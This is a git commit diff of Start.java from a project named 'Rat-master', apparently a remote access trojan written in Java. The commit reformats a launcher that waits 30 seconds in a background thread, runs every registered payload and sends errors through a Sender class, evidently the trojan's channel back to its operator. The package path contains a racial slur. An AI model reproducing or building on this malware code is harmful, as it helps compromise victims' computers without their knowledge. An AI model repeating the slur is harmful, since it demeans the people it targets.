833728c7bae0f3787ef512e1f47d38cd6a232ae6
Drilly Gang <108227357+LordDrilly@users.noreply.github.com>
2023-06-20 10:30:51 -0500

    Update Start.java

--- Rat-master/me/nigger/rat/Start.java
+++ Rat-master/me/nigger/rat/Start.java
@@ -4,13 +4,23 @@ import me.nigger.rat.payload.Payload;
 import me.nigger.rat.payload.PayloadRegistry;
 import me.nigger.rat.payload.Sender;
 
-public final class Start
-{
-    public static void start()
-    {
-        new Thread(() -> { try {
-            Thread.sleep(30000);
-            for (Payload payload : PayloadRegistry.getPayloads()) try { payload.execute(); } catch (Exception e) { Sender.send(e.getMessage()); }
-        } catch (Exception ignored) {}}).start();
+public final class Start {
+    public static void start() {
+        new Thread(() -> {
+            try {
+                Thread.sleep(30000);
+                for (Payload payload : PayloadRegistry.getPayloads()) {
+                    try {
+                        payload.execute();
+                    } catch (Exception e) {
+                        Sender.send(e.getMessage());
+                    }
+                }
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                Sender.send("Thread interrupted");
+            }
+        }).start();
     }
 }
+
